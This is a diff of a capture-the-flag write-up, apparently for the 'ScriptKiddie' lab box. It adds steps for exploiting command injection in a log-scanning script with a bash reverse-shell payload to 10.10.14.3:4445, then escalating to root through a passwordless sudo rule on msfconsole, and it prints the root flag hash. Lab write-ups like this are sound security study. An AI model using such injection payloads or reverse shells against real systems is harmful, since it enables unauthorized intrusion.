@@ -53,7 +53,7 @@ There is another user `pwn`, the plan was to find a way to this account. I used 
  ```
  $ nc -nvlp 4445
  ```
-Looking at the `scanlosers.sh` file in /home/pwn, the script is vulnerable to command injection. This payload contains a reverse shell that we can push to the log file `hackers`. 
+Looking at the `scanlosers.sh` file in /home/pwn, the script is vulnerable to command injection. This payload contains a reverse shell that we can push to the log file `hackers` in kid's home directory under `/home/kid/logs`. 
  ```
 echo "x x x 127.0.0.1; bash -c 'bash -i >& /dev/tcp/10.10.14.3/4445 0>&1' # ." > hackers
  ```
@@ -65,6 +65,28 @@ bash: cannot set terminal process group (866): Inappropriate ioctl for device
 bash: no job control in this shell
 pwn@scriptkiddie:~$ 
  ```
+Running `sudo -l`, it presented an obvious path to privilege escalation using Metasploit.
 ```
-TO BE CONTINUED  
+pwn@scriptkiddie:~/recon$ sudo -l
+sudo -l
+Matching Defaults entries for pwn on scriptkiddie:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User pwn may run the following commands on scriptkiddie:
+    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
+```
+Ran `sudo /opt/metasploit-framework-6.0.9/msfconsole` and went into the root directory for the root flag.
+```
+msf6 > cat /root/root.txt
+stty: 'standard input': Inappropriate ioctl for device
+[*] exec: cat /root/root.txt
+
+3dff2015ccc0f80fc0be44b5605b068d
+stty: 'standard input': Inappropriate ioctl for device
+stty: 'standard input': Inappropriate ioctl for device
+stty: 'standard input': Inappropriate ioctl for device
+stty: 'standard input': Inappropriate ioctl for device
+stty: 'standard input': Inappropriate ioctl for device
+msf6 > 
 ```
